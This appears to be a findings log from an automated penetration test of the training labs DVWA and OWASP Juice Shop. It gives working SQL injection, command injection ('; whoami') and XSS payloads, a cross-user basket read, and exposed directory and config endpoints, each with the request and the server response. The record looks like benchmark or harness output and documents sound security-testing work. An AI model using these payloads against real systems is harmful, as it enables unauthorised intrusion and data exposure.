findings.title: SQL Injection in id parameter of /vulnerabilities/sqli/ (Low security)
findings.response_evidence: TRUE (1' OR '1'='1): HTTP 200, 5 records: First name: admin / Surname: admin; First name: Gordon / Surname: Brown; First name: Hack / Surname: Me; First name: Pablo / Surname: Picasso; First name: Bob / Surname: Smith. FALSE (1' AND '1'='2): HTTP 200, zero records (page shows 'User ID:' with no ID/First name/Surname rows). Boolean TRUE returns multiple seeded users while FALSE returns none.

findings.title: OS Command Injection in ip parameter of /vulnerabilities/exec/ (Low security)
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, application/x-www-form-urlencoded)
findings.response_evidence: HTTP 200. Output contains ping statistics for 127.0.0.1 (4 packets transmitted, 4 received, 0% packet loss), followed by the injected command output line: "www-data". Container web-process identity www-data is returned in the response.

findings.title: Confidential acquisitions memo exposed via open directory listing at /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session unauth) - listing includes acquisitions.md (909 B)
findings.response_evidence: Directory listing at /ftp/ (unauthenticated) shows acquisitions.md 909 bytes. Direct GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown. Excerpt: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph..."

findings.title: Stored XSS in DVWA guestbook message field (xss_s, Low security)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form: txtName=verifier, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> 200
findings.response_evidence: POST response (200) lists stored entry 'Name: verifier Message: ...' alongside existing 'test: This is a test comment.'; the script payload was accepted server-side unescaped (maxlength=50 on mtxMessage satisfied). Browser rendering of http://dvwa/vulnerabilities/xss_s/ in dvwa_admin: window.xss_flag evaluated to 1.

findings.title: Cross-user basket access (BOLA) on /rest/basket/{id}: acct2 reads acct1's basket 6
findings.response_evidence: acct1 own basket 6: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (own basket 7) GET /rest/basket/6 returned HTTP 200 with the identical body: id 6, UserId 22, Products: Apple Juice (1000ml), quantity 3.

findings.title: SQL injection in /rest/products/search via q parameter (unauthenticated)
request_sequence: GET http://juiceshop:3000/rest/products/search?q=xyz%' OR 1=1 OR name LIKE '% (unauth) -> 200 with product list
Control (malformed, not used as evidence): q=xyz' OR '1'='1'-- -> 500 SQLITE_ERROR: incomplete input, showing SQL: ...name LIKE '%xyz' OR '1'='1'--%'...
findings.response_evidence: TRUE condition q=xyz%' OR 1=1 OR name LIKE '% returned status:success with multiple product records (e.g. ids 1 Apple Juice (1000ml), 24 Apple Pomace, 6 Banana Juice (1000ml), 42 Best Juice Shop Salesman Artwork, 30 Carrot Juice (1000ml), 3 Eggfruit Juice (500ml), 25 Fruit Press, 22 Green Smoothie, 41 Juice Shop "Permafrost" 2020 Edition, ...). FALSE condition q=xyz' AND '1'='2 returned {"status":"success","data":[]} (zero records). Additionally, a malformed quote injection produced a SQLITE_ERROR revealing the backend SQL, confirming user input is concatenated into the query.

findings.title: Open directory listing at /ftp/ exposes confidential files to unauthenticated users
findings.response_evidence: HTTP 200 text/html. Visible text: "listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723". The listing reveals acquisitions.md unauthenticated. Per coordinator, direct retrieval of acquisitions.md was already confirmed in a prior finding and was not re-verified here. Budget after check: HTTP 157 remaining.

findings.title: /rest/user/whoami over-disclosure check (authenticated acct1)
findings.response_evidence: HTTP 200 application/json; body_excerpt: {"user":{}}. The response contains no email, id, role, or token fields, so no sensitive data beyond the caller's own context is disclosed. Harness session_info confirms the session is acct1_bench@juiceshop.local with own_basket_id=6. Not a CWE-200 exposure.

findings.title: Unauthenticated access to admin application configuration exposes server and integration settings
findings.response_evidence: HTTP 200 application/json without authentication. body_excerpt: {"config":{"server":{"port":3000,"basePath":""},"application":{"domain":"juice-sh.op","name":"OWASP Juice Shop",...,"localBackupEnabled":true,"numberOfRandomFakeUsers":0,...,"privacyContactEmail":"donotreply@owasp-juice.shop","customMetricsPrefix":"juiceshop",...},"chatBot":{...},"social":{...},"googleOauth":{"clientId":"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com","authorizedRedirects":[{"uri":"https://demo.owasp-juice.shop"},...,{"uri":"http://localhost:3000","proxy":"https://local3000.owasp-juice.shop"},...]},"securityTxt":{...}}. Administrative configuration, including the OAuth client ID, authorized redirect URIs, and internal server and feature flags, is returned to an anonymous caller.

findings.title: Blind SQL injection in id parameter (sqli_blind) - boolean differential observed but names/surnames not retrievable
findings.response_evidence: TRUE condition (1' OR '1'='1): HTTP 200, body 'User ID exists in the database.' (pre_block). FALSE condition (1' AND '1'='2): HTTP 404, body 'User ID is MISSING from the database.' The TRUE/FALSE differential is present, but the page only reports existence and returns no user records, names, or surnames. The 'Username: admin' text is the logged-in session user, not injected data. The confirmation criterion (multiple seeded user records with names/surnames for TRUE) cannot be met, so the verdict is inconclusive rather than confirmed.

findings.title: Reflected XSS in name parameter (xss_r) - canary executes in browser
findings.response_evidence: HTTP 200 from xss_r with the canary reflected unencoded into the page. Browser DOM contains the raw element <script id="test_token">window.xss_flag=1</script> in document.body.innerHTML.

findings.title: Feedback comment XSS canary - stored comment sanitized to empty; no browser-executable rendering
request_sequence: POST http://juiceshop:3000/api/Feedbacks/ JSON {comment:'<script id="test_token">window.xss_flag=1</script>', rating:3, captchaId:0, captcha:'79', UserId:null} (session unauth)
findings.response_evidence: POST returned HTTP 201 with data {"id":9,"comment":"","rating":3,"UserId":null}. The subsequent list GET shows feedback id 9 with "comment":"" (payload stripped by server-side sanitization). The canary was not persisted, so there is no rendered context to execute it. GET /api/Feedbacks/9 requires authorization (401). Browser verification was not run because the stored comment contains no payload. Verdict is inconclusive, not confirmed.

tool_errors.recovery_detail: Recovered at tool step 95: GET http://juiceshop:3000/api/Feedbacks/ -> 200 (unauth)
